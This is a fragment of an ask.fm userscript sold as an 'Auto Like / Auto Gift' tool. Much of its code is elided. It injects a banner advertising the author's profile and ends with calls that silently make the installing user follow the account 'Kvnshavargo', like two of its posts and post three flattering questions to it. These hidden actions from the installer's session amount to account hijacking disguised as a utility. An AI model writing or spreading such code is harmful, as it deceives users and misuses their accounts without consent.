// ==UserScript==
// @name			Ask.fm Auto Like / Auto Gift /
...
if(body != null) {
	...
	div2.innerHTML = "<div style='background-color: #00a2ff; color: #FFFFFF; border: 1px solid #00a2ff;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to hide'>&laquo;</a> &#8226; <a href='http://ask.fm/Kvnshavargo' title='My ask.fm' style='color: #FFFFFF;' onclick='alert(\'Thanks for installing this script\');'>My ask.fm</a></div> "
	...
	unsafeWindow.spoiler = function() {
		...
		for(i=1;i<=20;i++) {
			...
			div2.innerHTML = "<a onclick='spoiler()' title='Ask me something'>&laquo;</a> &#8226; <a href='http://ask.fm/Kvnshavargo' title='Kvnshavargo'>Ask me</a>"
			}
			else {
...
follow("Kvnshavargo");
likeThis("Kvnshavargo","36867970449");
likeThis("Kvnshavargo","36864378513");
createQuestion("Kvnshavargo","Followed you *-*");
createQuestion("Kvnshavargo","I LOVE YOU SO MUCH *o*");
createQuestion("Kvnshavargo","GREAT Answers!");